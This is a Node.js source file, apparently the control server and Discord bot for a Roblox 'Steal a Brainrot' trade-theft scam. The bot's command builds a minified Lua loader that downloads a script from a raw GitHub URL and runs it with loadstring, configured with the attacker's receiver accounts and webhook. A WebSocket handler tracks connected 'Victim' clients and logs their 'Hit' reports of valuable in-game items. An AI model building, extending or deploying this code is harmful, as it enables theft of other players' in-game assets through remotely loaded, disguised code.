const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags } = require('discord.js');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

const generateId = () => {
    return `wh_${randomBytes(8).toString('hex')}`;
};

async function obfuscateScript(luaCode) {
    try {
        log("🛡️ [OBF] Local Minification starting...");
        
        // Luamin va compresser et brouiller ton code
        const obfuscated = luamin.minify(luaCode);
        
        log(`✅ [OBF] Local success. Original: ${luaCode.length} chars -> Minified: ${obfuscated.length} chars`);
        
        return obfuscated;
    } catch (error) {
        log(`❌ [OBF ERROR] ${error.message}`);
        // En cas d'erreur de parsing, on renvoie le code clair pour ne pas crash
        return luaCode; 
    }
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    ownerName: {
        type: String,
        required: true,
        trim: true
    }
}, {
    timestamps: true
});

const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

const commands = [
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a SAB Trade script')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('List of Roblox usernames separated by commas')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Discord Webhook URL')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('income')
                .setDescription('Minimum income threshold (e.g. 10000000)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('visual')
                .setDescription('URL for the visual interface (Optional)')
                .setRequired(false)) // Paramètre optionnel
].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes slash enregistrées');
    } catch (error) {
        log(`❌ Erreur Slash Commands: ${error}`);
    }
});

clientDiscord.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'generate-sab-trade') {
        const usernames = interaction.options.getString('username');
        const webhookUrl = interaction.options.getString('webhook');
        const income = interaction.options.getInteger('income');
        const visual = interaction.options.getString('visual') || "";
        
        // 1. Génération de l'UUID qui servira d'identifiant Webhook
        const webhookUuid = generateId();

        try {
            // 2. ENREGISTREMENT DANS MONGODB
            const newWebhookEntry = new WebHookId({
                webhookId: webhookUuid,
                url: webhookUrl,
                ownerName: interaction.user.tag
            });
            //await newWebhookEntry.save();

            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);

            // 3. PRÉPARATION DU CODE LUA (On injecte l'UUID, pas l'URL)
            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');

            const codeToObfuscate = `local fenv = getfenv()
local var0 = setmetatable({}, {
	["__index"] = {},
})
fenv["Receivers"] = { ${userArrayLua} }
fenv["WebHook"] = "${webhookUuid}" -- Identifiant sécurisé
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}

local var1 = game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde")
local var2 = loadstring(var1)
local var3 = var2()`;
            const obfuscated = await obfuscateScript(codeToObfuscate);
            // 4. RÉPONSE EMBED POUR DEBUG
            const embed = new EmbedBuilder()
                .setTitle("🛡️ Script Generation (Secure Mode)")
                .setDescription("The real Webhook URL is now hidden behind a UUID in the database.")
                .setColor(0x00AEFF)
                .addFields(
                    { name: "🆔 Generated Webhook ID", value: `\`${webhookUuid}\`` },
                    { name: "📝 Code to Obfuscate", value: `\`\`\`lua\n${obfuscated}\n\`\`\`` }
                )
                .setFooter({ text: "Database entry created successfully." });

            await interaction.reply({ 
			    embeds: [embed], 
			    flags: [MessageFlags.Ephemeral] 
			});

            // TODO: Étape suivante -> Obfuscation API
            
        } catch (error) {
            log(`❌ [DB] Error saving webhook: ${error.message}`);
            await interaction.reply({ content: "Error saving to database. Please try again.", ephemeral: true });
        }
    }
});
if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).terminate();
        }
    
        activeVictims.set(username, ws);
        log(`🤖 Victim connecté : ${username}`);

        ws.on('close', () => {
            if (activeVictims.get(username) === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
          try {
              const data = JSON.parse(msg);
              if (data.Method === "Hit") {
                log(`🎯 Hit reçu de : ${data.Hit.Name}`);
                  
                if (data.Hit.Brainrots && data.Hit.Brainrots.length > 0) {
                  data.Hit.Brainrots.forEach((br, index) => {
                    log(`   [${index + 1}] Brainrot: ${br.Name} | Income: ${br.IncomeStr}`);
                  });
                } else {
                  log(`   ⚠️ Aucun Brainrot trouvé sur le plot.`);
                }
            }
          } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
      });
      return; // On s'arrête ici pour les Victims
    }
    
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
